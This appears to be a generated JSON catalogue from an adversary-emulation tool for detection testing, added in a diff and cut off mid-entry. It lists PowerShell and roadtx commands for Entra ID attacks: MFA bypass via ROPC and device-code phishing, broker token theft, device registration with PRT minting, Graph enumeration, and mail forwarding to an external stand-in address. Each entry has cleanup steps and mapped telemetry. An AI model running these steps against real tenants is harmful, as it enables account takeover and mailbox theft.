@@ -1,0 +1,1392 @@
+{
+  "generatedAt": "2026-09-10T15:57:07.552Z",
+  "stats": {
+    "atomics": 20,
+    "kits": 7,
+    "telemetrySources": 4,
+    "evidenceClaims": 1,
+    "safetyGate": "100%"
+  },
+  "atomics": [
+    {
+      "slug": "T1078.001-ropc-legacy-auth",
+      "technique": "T1078.001",
+      "displayName": "Defense Evasion – ROPC Legacy Authentication (MFA Bypass)",
+      "testName": "Resource Owner Password Credentials flow via roadtx",
+      "description": "Authenticates using ROPC (username + password, no browser/MFA prompt) against an Entra tenant that has not blocked legacy auth. ROPC bypasses MFA because it uses a non-interactive flow exempt from most CA policies enforcing MFA. Wraps roadtx auth with username/password flags.",
+      "executor": "powershell",
+      "executorCommand": "roadtx auth `\n  --username '#{username}' `\n  --password '#{password}' `\n  --client '#{client_id}' `\n  --resource '#{resource}' `\n  --tenant '#{tenant_id}' `\n  --tokenfile '#{token_output_path}'",
+      "elevationRequired": false,
+      "cleanupCommand": "if (Test-Path -LiteralPath '#{token_output_path}') {\n    Remove-Item -LiteralPath '#{token_output_path}' -Force\n}",
+      "inputArguments": [
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "username",
+          "description": "Lab account UPN.",
+          "type": "String",
+          "default": ""
+        },
+        {
+          "name": "password",
+          "description": "Lab account password.",
+          "type": "String",
+          "default": ""
+        },
+        {
+          "name": "client_id",
+          "description": "OAuth client ID supporting ROPC (public client).",
+          "type": "String",
+          "default": "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
+        },
+        {
+          "name": "resource",
+          "description": "Target resource URI.",
+          "type": "String",
+          "default": "https://graph.microsoft.com"
+        },
+        {
+          "name": "token_output_path",
+          "description": "Path to write the resulting token cache file.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "phase": "Defense Evasion",
+      "authProfile": "ropc",
+      "defenseEvasion": "ROPC bypasses interactive MFA; targets tenants missing legacy-auth block CA policy",
+      "telemetrySources": [
+        "entra_signin"
+      ],
+      "mappedKits": [],
+      "chokepointId": "DC-EVAS-003",
+      "chokepointUrl": "https://detectionchokepoints.com/evasion/ropc-legacy-auth",
+      "references": [
+        "https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth-ropc"
+      ],
+      "hasCleanup": true,
+      "fidelity": "partial",
+      "featured": false
+    },
+    {
+      "slug": "T1078.004-auth-broker-abuse",
+      "technique": "T1078.004",
+      "displayName": "Defense Evasion – Authentication Broker Abuse (WAM/Web Account Manager)",
+      "testName": "Auth broker token acquisition via roadtx broker flow",
+      "description": "Abuses the Windows Authentication Broker (WAM) or platform SSO mechanism to silently acquire tokens for Entra-connected resources without interactive prompts. The broker trusts the existing device session; an attacker with local code execution can call the broker directly. Wraps roadtx broker command.",
+      "executor": "powershell",
+      "executorCommand": "roadtx browserbroker `\n  --client '#{client_id}' `\n  --resource '#{resource}' `\n  --tenant '#{tenant_id}' `\n  --tokenfile '#{token_output_path}'",
+      "elevationRequired": false,
+      "cleanupCommand": "if (Test-Path -LiteralPath '#{token_output_path}') {\n    Remove-Item -LiteralPath '#{token_output_path}' -Force\n}",
+      "inputArguments": [
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "client_id",
+          "description": "Client ID of the application to impersonate via broker.",
+          "type": "String",
+          "default": "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
+        },
+        {
+          "name": "resource",
+          "description": "Target resource URI.",
+          "type": "String",
+          "default": "https://graph.microsoft.com"
+        },
+        {
+          "name": "token_output_path",
+          "description": "Path to write the resulting token cache file.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows"
+      ],
+      "phase": "Defense Evasion",
+      "authProfile": "auth-broker",
+      "defenseEvasion": "Silent token acquisition via WAM broker; no MFA prompt; leverages existing device session",
+      "telemetrySources": [
+        "entra_signin"
+      ],
+      "mappedKits": [
+        "Eviltokens",
+        "Storm 2372"
+      ],
+      "chokepointId": "DC-EVAS-008",
+      "chokepointUrl": "https://detectionchokepoints.com/evasion/auth-broker-abuse",
+      "references": [
+        "https://dirkjanm.io/using-the-windows-authentication-broker-to-silently-steal-tokens/"
+      ],
+      "hasCleanup": true,
+      "fidelity": "partial",
+      "featured": false
+    },
+    {
+      "slug": "T1078.004-ca-gap-auth",
+      "technique": "T1078.004",
+      "displayName": "Defense Evasion – Conditional Access Gap Authentication",
+      "testName": "CA gap authentication via unprotected application",
+      "description": "Authenticates using an Entra application that is not covered by the tenant's Conditional Access policies (e.g., an old service principal, an unregistered first-party app, or a guest-accessible app). This is a custom primitive (allowed gap #2 in wrap-don't-write policy): roadtx does not expose a CA gap finder, so we enumerate unprotected apps via Microsoft.Graph and then authenticate through the discovered gap.",
+      "executor": "powershell",
+      "executorCommand": "# Enumerate CA policies and identify unprotected apps (custom gap-finder primitive).\nImport-Module Microsoft.Graph.Identity.SignIns -ErrorAction Stop\nConnect-MgGraph -TenantId '#{tenant_id}' -Scopes 'Policy.Read.All' -NoWelcome\n\n$policies      = Get-MgIdentityConditionalAccessPolicy -All\n$includedApps  = @()\n$excludedApps  = @()\n\nforeach ($pol in $policies | Where-Object { $_.State -eq 'enabled' }) {\n    $cond = $pol.Conditions.Applications\n    if ($cond.IncludeApplications) {\n        $includedApps += $cond.IncludeApplications\n    }\n    if ($cond.ExcludeApplications) {\n        $excludedApps += $cond.ExcludeApplications\n    }\n}\n\n$gapAppId = '#{gap_client_id}'\nif ($includedApps -contains 'All' -and $excludedApps -notcontains $gapAppId) {\n    Write-Warning \"App '$gapAppId' appears to be covered by CA policies.\"\n} else {\n    Write-Host \"App '$gapAppId' is not covered by all-apps CA policies – proceeding.\"\n}\n\nroadtx gettokens `\n  --device-code `\n  --client '#{gap_client_id}' `\n  --resource '#{resource}' `\n  --tenant '#{tenant_id}' `\n  --tokenfile '#{token_output_path}'",
+      "elevationRequired": false,
+      "cleanupCommand": "if (Test-Path -LiteralPath '#{token_output_path}') {\n    Remove-Item -LiteralPath '#{token_output_path}' -Force\n}",
+      "inputArguments": [
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "gap_client_id",
+          "description": "Client ID of an application not covered by CA policies.",
+          "type": "String",
+          "default": ""
+        },
+        {
+          "name": "resource",
+          "description": "Target resource URI.",
+          "type": "String",
+          "default": "https://graph.microsoft.com"
+        },
+        {
+          "name": "token_output_path",
+          "description": "Path to write the resulting token cache file.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "phase": "Defense Evasion",
+      "authProfile": "ca-gap",
+      "defenseEvasion": "Authenticates through an app not subject to MFA or compliant-device CA policies",
+      "telemetrySources": [
+        "entra_signin"
+      ],
+      "mappedKits": [
+        "Eviltokens",
+        "Storm 2372"
+      ],
+      "chokepointId": "DC-EVAS-005",
+      "chokepointUrl": "https://detectionchokepoints.com/evasion/ca-gap",
+      "references": [
+        "https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-conditional-access-cloud-apps"
+      ],
+      "hasCleanup": true,
+      "fidelity": "partial",
+      "featured": false
+    },
+    {
+      "slug": "T1078.004-device-code",
+      "technique": "T1078.004",
+      "displayName": "AiTM – Device Code Phishing (Entra ID)",
+      "testName": "Device Code Flow Phishing via roadtx",
+      "description": "Emulates device-code phishing: sends a victim a code to enter at microsoft.com/devicelogin, then polls for the resulting token. Exercises the Entra \"device code\" sign-in pattern and bypasses MFA because the victim completes MFA on their own device. Wraps roadtx (roadtools); requires roadtx installed via Install-TackleboxDependencies -Component roadtx.",
+      "executor": "powershell",
+      "executorCommand": "roadtx gettokens `\n  --device-code `\n  --client '#{client_id}' `\n  --resource '#{resource}' `\n  --tenant '#{tenant_id}' `\n  --tokenfile '#{token_output_path}'",
+      "elevationRequired": false,
+      "cleanupCommand": "if (Test-Path -LiteralPath '#{token_output_path}') {\n    Remove-Item -LiteralPath '#{token_output_path}' -Force\n}",
+      "inputArguments": [
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID (GUID) of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "client_id",
+          "description": "OAuth2 client ID to request a device code for (default: Azure CLI app).",
+          "type": "String",
+          "default": "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
+        },
+        {
+          "name": "resource",
+          "description": "Target resource URI.",
+          "type": "String",
+          "default": "https://graph.microsoft.com"
+        },
+        {
+          "name": "token_output_path",
+          "description": "Path to write the resulting token cache file.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "phase": "Initial access",
+      "authProfile": "device-code",
+      "defenseEvasion": "MFA bypass via device-code flow (victim completes MFA; attacker receives token)",
+      "telemetrySources": [
+        "entra_signin"
+      ],
+      "mappedKits": [
+        "Eviltokens",
+        "Storm 2372"
+      ],
+      "chokepointId": "DC-AUTH-001",
+      "chokepointUrl": "https://detectionchokepoints.com/auth/device-code-phishing",
+      "references": [
+        "https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/",
+        "https://aadinternals.com/post/aitm/"
+      ],
+      "hasCleanup": true,
+      "fidelity": "partial",
+      "featured": true
+    },
+    {
+      "slug": "T1078.004-em-client-signin",
+      "technique": "T1078.004",
+      "displayName": "Post-Exploitation – eM Client OAuth Sign-In (Custom Primitive)",
+      "testName": "Authenticate as eM Client to access mailbox silently",
+      "description": "Emulates the eM Client email application's OAuth2 authentication flow, which uses a hardcoded client ID and redirect URI that many Entra tenants have not blocked. This is custom primitive #1 (allowed gap in wrap-don't-write policy): no upstream tool implements the exact eM Client OAuth handshake, so a minimal raw OAuth2 helper is used. The client ID is the known eM Client App ID (b084e965-ad12-4b2e-a979-6c0f58b73b6c).",
+      "executor": "powershell",
+      "executorCommand": "# eM Client custom primitive: raw OAuth2 ROPC for the eM Client App ID.\n# This client ID is known to be exempt from MFA in some tenant configs.\n$emClientId    = 'b084e965-ad12-4b2e-a979-6c0f58b73b6c'\n$tokenEndpoint = \"https://login.microsoftonline.com/#{tenant_id}/oauth2/v2.0/token\"\n\n$body = @{\n    grant_type    = 'password'\n    client_id     = $emClientId\n    username      = '#{username}'\n    password      = '#{password}'\n    scope         = 'openid profile offline_access https://outlook.office.com/IMAP.AccessAsUser.All'\n}\n\ntry {\n    $response = Invoke-RestMethod -Method Post -Uri $tokenEndpoint `\n        -ContentType 'application/x-www-form-urlencoded' `\n        -Body $body -ErrorAction Stop\n} catch {\n    $detail = ($_ | ConvertFrom-Json -ErrorAction SilentlyContinue)\n    throw \"eM Client auth failed: $($detail.error_description ?? $_.Exception.Message)\"\n}\n\n$cacheData = @{\n    accessToken  = $response.access_token\n    refreshToken = $response.refresh_token\n    idToken      = $response.id_token\n    tokenType    = $response.token_type\n    expiresOn    = ((Get-Date).AddSeconds($response.expires_in).ToUniversalTime().ToString('o'))\n    _clientId    = $emClientId\n    tenantId     = '#{tenant_id}'\n    resource     = 'https://outlook.office.com'\n}\n\n$cacheData | ConvertTo-Json -Depth 4 |\n    Set-Content -LiteralPath '#{token_output_path}' -NoNewline\nWrite-Host \"eM Client token cached at '#{token_output_path}'.\"",
+      "elevationRequired": false,
+      "cleanupCommand": "if (Test-Path -LiteralPath '#{token_output_path}') {\n    Remove-Item -LiteralPath '#{token_output_path}' -Force\n}",
+      "inputArguments": [
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "username",
+          "description": "Lab account UPN to authenticate as eM Client.",
+          "type": "String",
+          "default": ""
+        },
+        {
+          "name": "password",
+          "description": "Lab account password.",
+          "type": "String",
+          "default": ""
+        },
+        {
+          "name": "token_output_path",
+          "description": "Path to write the resulting token cache file.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "phase": "Post-Exploitation",
+      "authProfile": "em-client",
+      "defenseEvasion": "eM Client App ID may be exempt from MFA CA policies; IMAP scope enables silent mail access",
+      "telemetrySources": [
+        "entra_signin",
+        "ual"
+      ],
+      "mappedKits": [
+        "Eviltokens",
+        "Storm 2372"
+      ],
+      "chokepointId": "DC-POSTEX-004",
+      "chokepointUrl": "https://detectionchokepoints.com/postex/em-client-signin",
+      "references": [
+        "https://o365blog.com/post/em-client/",
+        "https://aadinternals.com/post/aitm/"
+      ],
+      "hasCleanup": true,
+      "fidelity": "partial",
+      "featured": false
+    },
+    {
+      "slug": "T1078.004-suspicious-ua-signin",
+      "technique": "T1078.004",
+      "displayName": "Defense Evasion – Suspicious User-Agent Sign-In",
+      "testName": "Token acquisition with anomalous User-Agent via roadtx",
+      "description": "Authenticates with a User-Agent string that does not match the victim's typical browser/client fingerprint. AiTM kits often replay session cookies using the kit's own UA, creating a detectable anomaly in Entra sign-in logs. Wraps roadtx with a custom --user-agent flag.",
+      "executor": "powershell",
+      "executorCommand": "roadtx gettokens `\n  --device-code `\n  --client '#{client_id}' `\n  --resource '#{resource}' `\n  --tenant '#{tenant_id}' `\n  --user-agent '#{user_agent}' `\n  --tokenfile '#{token_output_path}'",
+      "elevationRequired": false,
+      "cleanupCommand": "if (Test-Path -LiteralPath '#{token_output_path}') {\n    Remove-Item -LiteralPath '#{token_output_path}' -Force\n}",
+      "inputArguments": [
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "client_id",
+          "description": "OAuth client ID.",
+          "type": "String",
+          "default": "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
+        },
+        {
+          "name": "resource",
+          "description": "Target resource URI.",
+          "type": "String",
+          "default": "https://graph.microsoft.com"
+        },
+        {
+          "name": "user_agent",
+          "description": "Anomalous User-Agent string to present during authentication.",
+          "type": "String",
+          "default": "python-requests/2.31.0"
+        },
+        {
+          "name": "token_output_path",
+          "description": "Path to write the resulting token cache file.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "phase": "Defense Evasion",
+      "authProfile": "suspicious-ua",
+      "defenseEvasion": "Non-browser UA fingerprint during token acquisition; detectable in sign-in logs",
+      "telemetrySources": [
+        "entra_signin"
+      ],
+      "mappedKits": [
+        "Eviltokens",
+        "Storm 2372"
+      ],
+      "chokepointId": "DC-EVAS-004",
+      "chokepointUrl": "https://detectionchokepoints.com/evasion/suspicious-ua",
+      "references": [
+        "https://techcommunity.microsoft.com/t5/microsoft-entra/aitm-phishing-playbook/ba-p/3761965"
+      ],
+      "hasCleanup": true,
+      "fidelity": "partial",
+      "featured": true
+    },
+    {
+      "slug": "T1078.004-token-protection-evasion",
+      "technique": "T1078.004",
+      "displayName": "Defense Evasion – Entra Token Protection Policy Bypass",
+      "testName": "Token Protection CA policy bypass via legacy client",
+      "description": "Authenticates using a client application or flow that is not covered by a Token Protection Conditional Access policy, bypassing the binding of tokens to the originating device. Wraps roadtx to authenticate with a client that does not support proof-of-possession (PoP) tokens.",
+      "executor": "powershell",
+      "executorCommand": "roadtx gettokens `\n  --device-code `\n  --client '#{client_id}' `\n  --resource '#{resource}' `\n  --tenant '#{tenant_id}' `\n  --tokenfile '#{token_output_path}'",
+      "elevationRequired": false,
+      "cleanupCommand": "if (Test-Path -LiteralPath '#{token_output_path}') {\n    Remove-Item -LiteralPath '#{token_output_path}' -Force\n}",
+      "inputArguments": [
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "client_id",
+          "description": "Client ID of an app not subject to Token Protection policy.",
+          "type": "String",
+          "default": "1b730954-1685-4b74-9bfd-dac224a7b894"
+        },
+        {
+          "name": "resource",
+          "description": "Target resource.",
+          "type": "String",
+          "default": "https://graph.microsoft.com"
+        },
+        {
+          "name": "token_output_path",
+          "description": "Path to write the resulting token.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "phase": "Defense Evasion",
+      "authProfile": "token-protection-bypass",
+      "defenseEvasion": "Obtains bearer token not subject to Token Protection PoP binding",
+      "telemetrySources": [
+        "entra_signin",
+        "graph_audit"
+      ],
+      "mappedKits": [
+        "Eviltokens",
+        "Storm 2372"
+      ],
+      "chokepointId": "DC-EVAS-002",
+      "chokepointUrl": "https://detectionchokepoints.com/evasion/token-protection-bypass",
+      "references": [
+        "https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-token-protection"
+      ],
+      "hasCleanup": true,
+      "fidelity": "partial",
+      "featured": false
+    },
+    {
+      "slug": "T1087.004-graph-enumeration",
+      "technique": "T1087.004",
+      "displayName": "Post-Exploitation – Azure AD / Entra Graph Enumeration",
+      "testName": "Enumerate users, groups, and roles via Microsoft Graph",
+      "description": "Enumerates users, groups, service principals, and role assignments from an Entra tenant using a delegated or application Graph token. Maps to CISA's documented BEC reconnaissance phase. Wraps Microsoft.Graph PowerShell module.",
+      "executor": "powershell",
+      "executorCommand": "Import-Module Microsoft.Graph.Users    -ErrorAction Stop\nImport-Module Microsoft.Graph.Groups   -ErrorAction Stop\nImport-Module Microsoft.Graph.Identity.DirectoryManagement -ErrorAction Stop\n\n$token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)\nConnect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome\n\n$results = [ordered]@{\n    users           = @(Get-MgUser -All -Select 'userPrincipalName,displayName,jobTitle,mail' | Select-Object -First 50)\n    groups          = @(Get-MgGroup -All -Select 'displayName,mail,groupTypes' | Select-Object -First 50)\n    directoryRoles  = @(Get-MgDirectoryRole -All | Select-Object -First 20)\n}\n\n$results | ConvertTo-Json -Depth 6 |\n    Set-Content -LiteralPath '#{output_path}'\n\nWrite-Host \"Enumeration complete: $($results.users.Count) users, $($results.groups.Count) groups, $($results.directoryRoles.Count) roles.\"",
+      "elevationRequired": false,
+      "cleanupCommand": "if (Test-Path -LiteralPath '#{output_path}') {\n    Remove-Item -LiteralPath '#{output_path}' -Force\n}",
+      "inputArguments": [
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "output_path",
+          "description": "Path to write enumeration results as JSON.",
+          "type": "Path",
+          "default": "tacklebox-enum-results.json"
+        },
+        {
+          "name": "token_cache_path",
+          "description": "Path to the Graph-scoped token cache file.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "phase": "Post-Exploitation",
+      "authProfile": "graph-delegated",
+      "defenseEvasion": "Read-only enumeration blends with legitimate admin activity",
+      "telemetrySources": [
+        "graph_audit"
+      ],
+      "mappedKits": [
+        "Eviltokens",
+        "Storm 2372",
+        "Tycoon"
+      ],
+      "chokepointId": "DC-POSTEX-005",
+      "chokepointUrl": "https://detectionchokepoints.com/postex/graph-enumeration",
+      "references": [
+        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-093a"
+      ],
+      "hasCleanup": true,
+      "fidelity": "strong",
+      "featured": true
+    },
+    {
+      "slug": "T1098.005-device-registration-prt",
+      "technique": "T1098.005",
+      "displayName": "Defense Evasion – Device Registration and PRT Acquisition",
+      "testName": "Register lab device and acquire PRT via roadtx",
+      "description": "Registers an attacker-controlled device with Entra ID using a stolen access token, then acquires a Primary Refresh Token (PRT) tied to that device. With a PRT, the attacker can silently mint tokens for any resource without further MFA. Wraps roadtx prt and roadtx device.",
+      "executor": "powershell",
+      "executorCommand": "roadtx device `\n  --action register `\n  --name '#{device_name}' `\n  --tenant '#{tenant_id}' `\n  --tokenfile '#{token_input_path}'\n\nroadtx prt `\n  --action request `\n  --tenant '#{tenant_id}' `\n  --tokenfile '#{prt_output_path}'",
+      "elevationRequired": false,
+      "cleanupCommand": "roadtx device `\n  --action delete `\n  --name '#{device_name}' `\n  --tenant '#{tenant_id}' `\n  --tokenfile '#{token_input_path}'",
+      "inputArguments": [
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "device_name",
+          "description": "Display name for the registered device.",
+          "type": "String",
+          "default": "TackleboxLabDevice"
+        },
+        {
+          "name": "token_input_path",
+          "description": "Path to an existing token cache (requires Device.ReadWrite.All or similar).",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        },
+        {
+          "name": "prt_output_path",
+          "description": "Path to write the acquired PRT.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "phase": "Defense Evasion",
+      "authProfile": "device-registration-prt",
+      "defenseEvasion": "PRT acquisition via attacker-registered device; enables silent SSO token minting",
+      "telemetrySources": [
+        "graph_audit",
+        "entra_signin"
+      ],
+      "mappedKits": [
+        "Storm 2372",
+        "Tycoon"
+      ],
+      "chokepointId": "DC-EVAS-007",
+      "chokepointUrl": "https://detectionchokepoints.com/evasion/device-registration-prt",
+      "references": [
+        "https://dirkjanm.io/abusing-azure-ad-sso-with-the-on-behalf-of-flow/",
+        "https://aadinternals.com/post/prt/"
+      ],
+      "hasCleanup": true,
+      "fidelity": "partial",
+      "featured": true
+    },
+    {
+      "slug": "T1114.002-mail-items-accessed",
+      "technique": "T1114.002",
+      "displayName": "Post-Exploitation – MailItemsAccessed Audit Event Generation",
+      "testName": "Access mailbox items via Graph API to generate MailItemsAccessed events",
+      "description": "Reads messages from a victim's mailbox via the Microsoft Graph API, generating MailItemsAccessed events in the Unified Audit Log. MailItemsAccessed is a premium E5 audit event that records every OAuth or MAPI access to mailbox items. Wraps Microsoft.Graph.",
+      "executor": "powershell",
+      "executorCommand": "Import-Module Microsoft.Graph.Mail -ErrorAction Stop\n$token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)\nConnect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome\n\n$messages = Get-MgUserMessage `\n    -UserId '#{target_user_id}' `\n    -Top #{message_count} `\n    -Select 'id,subject,receivedDateTime,sender'\n\n$messages | Select-Object Subject, ReceivedDateTime, @{N='From';E={$_.Sender.EmailAddress.Address}} |\n    ConvertTo-Json | Set-Content -LiteralPath '#{output_path}'\n\nWrite-Host \"Accessed $($messages.Count) mail item(s) for '#{target_user_id}'.\"",
+      "elevationRequired": false,
+      "cleanupCommand": "if (Test-Path -LiteralPath '#{output_path}') {\n    Remove-Item -LiteralPath '#{output_path}' -Force\n}",
+      "inputArguments": [
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "target_user_id",
+          "description": "User ID or UPN of the mailbox to access.",
+          "type": "String",
+          "default": ""
+        },
+        {
+          "name": "message_count",
+          "description": "Number of messages to read (generates audit events).",
+          "type": "Integer",
+          "default": "5"
+        },
+        {
+          "name": "output_path",
+          "description": "Path to write sampled message subjects (for evidence).",
+          "type": "Path",
+          "default": "tacklebox-mail-items.json"
+        },
+        {
+          "name": "token_cache_path",
+          "description": "Path to a Graph-scoped token cache file.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "phase": "Post-Exploitation",
+      "authProfile": "graph-delegated",
+      "defenseEvasion": "OAuth Graph access to mailbox items; detectable only with E5 MailItemsAccessed audit",
+      "telemetrySources": [
+        "ual"
+      ],
+      "mappedKits": [
+        "Storm 2372",
+        "Tycoon"
+      ],
+      "chokepointId": "DC-POSTEX-003",
+      "chokepointUrl": "https://detectionchokepoints.com/postex/mail-items-accessed",
+      "references": [
+        "https://learn.microsoft.com/en-us/purview/audit-mailitemsaccessed"
+      ],
+      "hasCleanup": true,
+      "fidelity": "strong",
+      "featured": false
+    },
+    {
+      "slug": "T1114.002-mailbox-forwarding",
+      "technique": "T1114.002",
+      "displayName": "Post-Exploitation – Mailbox Forwarding via Exchange Online",
+      "testName": "Set SMTP forwarding on victim mailbox via ExchangeOnlineManagement",
+      "description": "Sets external SMTP forwarding on a victim mailbox to silently copy all inbound mail to an attacker-controlled address. A classic BEC persistence mechanism. Wraps ExchangeOnlineManagement Set-Mailbox. Requires an EXO-scoped access token.",
+      "executor": "powershell",
+      "executorCommand": "Import-Module ExchangeOnlineManagement -ErrorAction Stop\n$token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)\nConnect-ExchangeOnline -AccessToken $token.accessToken -Organization '#{tenant_id}' -ShowBanner:$false\nSet-Mailbox -Identity '#{target_mailbox}' `\n            -ForwardingSmtpAddress 'smtp:#{forwarding_address}' `\n            -DeliverToMailboxAndForward $true\nDisconnect-ExchangeOnline -Confirm:$false",
+      "elevationRequired": false,
+      "cleanupCommand": "Import-Module ExchangeOnlineManagement -ErrorAction Stop\n$token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)\nConnect-ExchangeOnline -AccessToken $token.accessToken -Organization '#{tenant_id}' -ShowBanner:$false\nSet-Mailbox -Identity '#{target_mailbox}' -ForwardingSmtpAddress $null -DeliverToMailboxAndForward $false\nDisconnect-ExchangeOnline -Confirm:$false",
+      "inputArguments": [
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "target_mailbox",
+          "description": "UPN of the mailbox to configure forwarding on.",
+          "type": "String",
+          "default": ""
+        },
+        {
+          "name": "forwarding_address",
+          "description": "External SMTP address to forward mail to.",
+          "type": "String",
+          "default": "lab-attacker@example.com"
+        },
+        {
+          "name": "token_cache_path",
+          "description": "Path to the EXO-scoped token cache file.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "phase": "Post-Exploitation",
+      "authProfile": "exo-delegated",
+      "defenseEvasion": "Silent exfiltration via SMTP forwarding; no mailbox login required post-setup",
+      "telemetrySources": [
+        "ual",
+        "exo_audit"
+      ],
+      "mappedKits": [
+        "Storm 2372",
+        "Tycoon"
+      ],
+      "chokepointId": "DC-POSTEX-001",
+      "chokepointUrl": "https://detectionchokepoints.com/postex/mailbox-forwarding",
+      "references": [
+        "https://thedfirreport.com/2023/01/09/you-ve-been-hit-with-a-bec/"
+      ],
+      "hasCleanup": true,
+      "fidelity": "strong",
+      "featured": false
+    },
+    {
+      "slug": "T1114.003-email-rules-exfil",
+      "technique": "T1114.003",
+      "displayName": "Post-Exploitation – Email Forwarding Rule (Inbox Rule Exfiltration)",
+      "testName": "Create inbox forwarding rule via Microsoft Graph",
+      "description": "Creates a server-side inbox rule that forwards matching emails to an external address. Unlike SMTP forwarding, inbox rules can filter by keyword, sender, or subject — enabling targeted intelligence collection. Wraps Microsoft.Graph to create the rule via the mailFolders/inbox/messageRules API endpoint.",
+      "executor": "powershell",
+      "executorCommand": "Import-Module Microsoft.Graph.Mail -ErrorAction Stop\n$token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)\nConnect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome\n\n$ruleBody = @{\n    displayName = '#{rule_name}'\n    isEnabled   = $true\n    sequence    = 1\n    conditions  = @{\n        subjectContains = @('#{subject_filter}')\n    }\n    actions = @{\n        forwardTo = @(\n            @{\n                emailAddress = @{\n                    address = '#{forwarding_address}'\n                }\n            }\n        )\n        stopProcessingRules = $true\n    }\n}\nNew-MgUserMailFolderMessageRule `\n    -UserId '#{target_user_id}' `\n    -MailFolderId 'inbox' `\n    -BodyParameter $ruleBody",
+      "elevationRequired": false,
+      "cleanupCommand": "Import-Module Microsoft.Graph.Mail -ErrorAction Stop\n$token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)\nConnect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome\n$rules = Get-MgUserMailFolderMessageRule -UserId '#{target_user_id}' -MailFolderId 'inbox'\n$target = $rules | Where-Object { $_.DisplayName -eq '#{rule_name}' }\nif ($target) {\n    Remove-MgUserMailFolderMessageRule -UserId '#{target_user_id}' -MailFolderId 'inbox' -MessageRuleId $target.Id -Confirm:$false\n}",
+      "inputArguments": [
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "target_user_id",
+          "description": "User ID or UPN of the mailbox owner.",
+          "type": "String",
